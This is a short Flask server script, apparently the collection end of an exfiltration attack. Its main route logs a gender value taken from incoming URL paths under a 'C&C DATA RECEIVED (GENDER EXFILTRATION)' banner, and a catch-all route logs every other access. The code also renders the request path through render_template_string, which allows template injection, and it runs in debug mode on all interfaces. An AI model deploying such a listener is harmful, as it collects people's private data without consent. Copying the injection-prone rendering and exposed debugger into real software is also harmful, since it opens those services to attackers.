from flask import Flask, request, render_template_string, abort

app = Flask(__name__)

HTML_RESPONSE_BASE = """
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>検証成功</title>
</head>
<body>
    <h1>Data Received.</h1>
    <p>セキュリティ検証データが正常に受信されました。ありがとうございました。</p>
    <p>Accessed URL Path: <strong>{accessed_path}</strong></p>
</body>
</html>
"""

@app.route('/data/gender/<path:gender_info>')
def receive_gender(gender_info):
    clean_info = gender_info.split('.')[0]
    
    print("\n=======================================")
    print("✅ C&C DATA RECEIVED (GENDER EXFILTRATION)")
    print(f"   -> Received Path: /data/gender/{gender_info}")
    print(f"   -> Extracted Data: {clean_info.upper()}")
    print(f"   -> Full Access URL: {request.url}")
    print("=======================================")
    
    return render_template_string(HTML_RESPONSE_BASE.format(accessed_path=request.path))

# --- CATCH-ALL ROUTE (任意のパスに対応し、404を回避) ---
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    print("\n--- GENERAL ACCESS LOG ---")
    print(f"   -> Received Path: /{path}")
    print(f"   -> Full Access URL: {request.url}")
    print("--------------------------")
    
    return render_template_string(HTML_RESPONSE_BASE.format(accessed_path=request.path))

# --- サーバー起動設定 ---
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=True)
